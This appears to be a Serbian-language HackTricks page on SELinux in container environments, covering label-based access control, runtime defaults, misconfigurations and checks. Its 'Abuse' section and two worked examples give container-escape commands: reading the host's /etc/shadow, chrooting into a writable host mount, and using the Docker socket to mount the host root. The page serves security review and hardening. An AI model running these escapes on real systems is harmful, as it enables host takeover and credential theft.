# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

SELinux je sistem **Mandatory Access Control** zasnovan na oznakama. Svaki relevantan proces i objekat može imati bezbednosni kontekst, a policy određuje koji domeni mogu da komuniciraju sa kojim tipovima i na koji način. U containerized okruženjima to obično znači da runtime pokreće container proces u okviru ograničenog container domena i označava sadržaj containera odgovarajućim tipovima. Ako policy pravilno funkcioniše, proces može da čita i upisuje ono čemu se očekuje da njegova oznaka pristupa, dok mu se pristup drugom sadržaju hosta uskraćuje, čak i ako taj sadržaj postane vidljiv kroz mount.

Ovo je jedna od najmoćnijih zaštita na strani hosta dostupnih u mainstream Linux container deploymentima. Posebno je važna na Fedora, RHEL, CentOS Stream, OpenShift i drugim SELinux-centric ekosistemima. U tim okruženjima, reviewer koji zanemari SELinux često neće razumeti zašto je naizgled očigledan put ka kompromitovanju hosta zapravo blokiran.

## AppArmor naspram SELinux

Najjednostavnija razlika na visokom nivou jeste to što je AppArmor zasnovan na putanjama, dok je SELinux **zasnovan na oznakama**. To ima velike posledice po container security. Policy zasnovan na putanjama može se ponašati drugačije ako isti sadržaj hosta postane vidljiv pod neočekivanom mount putanjom. Policy zasnovan na oznakama umesto toga proverava koja je oznaka objekta i šta domen procesa sme da radi sa njim. To ne čini SELinux jednostavnim, ali ga čini otpornim na jednu klasu pretpostavki zasnovanih na trikovima sa putanjama, koje defenders ponekad slučajno prave u sistemima zasnovanim na AppArmor-u.

Pošto je model orijentisan na oznake, rukovanje container volume-ima i odluke o relabelingu su od ključnog značaja za security. Ako runtime ili operator preširoko promeni oznake da bi „mountovi radili“, granica policy-ja koja je trebalo da ograniči workload može postati mnogo slabija nego što je planirano.

## Lab

Da biste proverili da li je SELinux aktivan na hostu:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Za pregled postojećih oznaka na hostu:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Da biste uporedili normalno pokretanje sa onim pri kojem je označavanje onemogućeno:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hostu sa omogućenim SELinux-om, ovo je veoma praktična demonstracija jer pokazuje razliku između workload-a koji radi u očekivanom container domain-u i onog kome je taj enforcement layer uklonjen.

## Upotreba u runtime-u

Podman je posebno dobro usklađen sa SELinux-om na sistemima gde je SELinux deo podrazumevane platforme. Rootless Podman plus SELinux predstavljaju jednu od najjačih mainstream container baseline konfiguracija, jer je proces već neprivilegovan na strani hosta, a i dalje je ograničen MAC policy-jem. Docker takođe može da koristi SELinux tamo gde je podržan, iako ga administratori ponekad onemogućavaju da bi zaobišli probleme sa volume labeling-om. CRI-O i OpenShift se u velikoj meri oslanjaju na SELinux kao deo svoje priče o container isolation-u. Kubernetes takođe može da izloži podešavanja povezana sa SELinux-om, ali njihova vrednost očigledno zavisi od toga da li OS node-a zaista podržava i sprovodi SELinux.

Pouka koja se stalno ponavlja jeste da SELinux nije opciona dekoracija. U ekosistemima koji su izgrađeni oko njega, on je deo očekivane security boundary.

## Misconfigurations

Klasična greška je `label=disable`. Operativno, do ovoga često dolazi zato što je volume mount odbijen, a najbrži kratkoročni odgovor bio je uklanjanje SELinux-a iz jednačine umesto ispravljanja labeling model-a. Još jedna česta greška jeste neispravno relabeling host sadržaja. Široke relabel operacije mogu omogućiti aplikaciji da radi, ali takođe mogu proširiti ono što container-u dozvoljavaju da dodiruje daleko izvan prvobitne namene.

Takođe je važno ne mešati **installed** SELinux sa **effective** SELinux-om. Host može da podržava SELinux, a da i dalje bude u permissive mode-u, ili runtime možda ne pokreće workload u očekivanom domain-u. U tim slučajevima zaštita je mnogo slabija nego što bi dokumentacija mogla da sugeriše.

## Abuse

Kada SELinux nedostaje, radi u permissive mode-u ili je široko onemogućen za workload, putanje montirane sa hosta postaju mnogo lakše za abuse. Isti bind mount koji bi inače bio ograničen label-ima može postati direktan put do host podataka ili do izmene hosta. Ovo je posebno relevantno kada se kombinuje sa writable volume mount-ovima, container runtime direktorijumima ili operativnim prečicama koje su radi praktičnosti izložile osetljive putanje hosta.

SELinux često objašnjava zašto generic breakout writeup odmah funkcioniše na jednom hostu, ali stalno ne uspeva na drugom, iako runtime flag-ovi izgledaju slično. Sastojak koji nedostaje često uopšte nije namespace ili capability, već label boundary koji je ostao očuvan.

Najbrža praktična provera jeste poređenje aktivnog context-a, a zatim probe montiranih host putanja ili runtime direktorijuma koji bi obično bili ograničeni label-ima:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ako je prisutan host bind mount, a SELinux labeling je onemogućen ili oslabljen, najčešće prvo dolazi do otkrivanja informacija:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ako je mount upisiv i kontejner je iz perspektive kernela efektivno host-root, sledeći korak je testirati kontrolisanu izmenu hosta umesto nagađanja:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostovima koji podržavaju SELinux, gubitak labela oko direktorijuma sa runtime stanjem takođe može otkriti direktne putanje za eskalaciju privilegija:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ove komande ne zamenjuju kompletan escape chain, ali veoma brzo pokazuju da li je SELinux sprečavao pristup host podacima ili izmenu fajlova na host strani.

### Kompletan primer: SELinux Disabled + Writable Host Mount

Ako je SELinux labeling disabled, a host filesystem montiran sa dozvolom za upis na `/host`, kompletan host escape postaje običan bind-mount abuse case:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako `chroot` uspe, proces kontejnera sada radi iz sistema datoteka hosta:
```bash
id
hostname
cat /etc/passwd | tail
```
### Potpun primer: SELinux onemogućen + Runtime direktorijum

Ako workload može da dosegne runtime socket kada su labele onemogućene, escape može da se delegira runtime-u:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Relevantno zapažanje jeste da je SELinux često bio kontrola koja je sprečavala upravo ovakvu vrstu pristupa putanjama hosta ili stanju runtime-a.

## Provere

Cilj SELinux provera jeste da potvrde da je SELinux omogućen, utvrde trenutni security context i provere da li su datoteke ili putanje koje vas zanimaju zaista ograničene labelama.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Šta je ovde važno:

- `getenforce` bi u idealnom slučaju trebalo da vrati `Enforcing`; `Permissive` ili `Disabled` menja značenje celog odeljka o SELinux-u.
- Ako kontekst trenutnog procesa izgleda neočekivano ili preširoko, workload možda ne radi u okviru predviđene container policy.
- Ako host-mounted fajlovi ili runtime direktorijumi imaju labele kojima proces može pristupati previše slobodno, bind mounts postaju mnogo opasniji.

Prilikom pregleda containera na platformi koja podržava SELinux, nemojte labeling tretirati kao sporedan detalj. U mnogim slučajevima, on je jedan od glavnih razloga zbog kojih host već nije compromised.

## Podrazumevane Runtime Postavke

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Zavisi od hosta | SELinux separation je dostupna na hostovima sa omogućenim SELinux-om, ali tačno ponašanje zavisi od konfiguracije hosta/daemon-a | `--security-opt label=disable`, široko relabeling bind mount-ova, `--privileged` |
| Podman | Obično omogućen na SELinux hostovima | SELinux separation je uobičajeni deo Podman-a na SELinux sistemima, osim ako nije onemogućena | `--security-opt label=disable`, `label=false` u `containers.conf`, `--privileged` |
| Kubernetes | Generalno se ne dodeljuje automatski na nivou Pod-a | SELinux podrška postoji, ali Pod-ovima su obično potrebni `securityContext.seLinuxOptions` ili podrazumevane vrednosti specifične za platformu; potrebna je podrška runtime-a i node-a | slabe ili preširoke `seLinuxOptions`, pokretanje na permissive/disabled node-ovima, platform policies koje onemogućavaju labeling |
| CRI-O / OpenShift style deployments | Često se u velikoj meri oslanjaju na njega | SELinux je često ključni deo modela izolacije node-a u ovim okruženjima | custom policies koje previše proširuju pristup, onemogućavanje labeling-a zbog kompatibilnosti |

SELinux defaults više zavise od distribucije nego seccomp defaults. Na Fedora/RHEL/OpenShift-style sistemima, SELinux je često centralni deo modela izolacije. Na sistemima koji ne koriste SELinux, jednostavno nije prisutan.
{{#include ../../../../banners/hacktricks-training.md}}
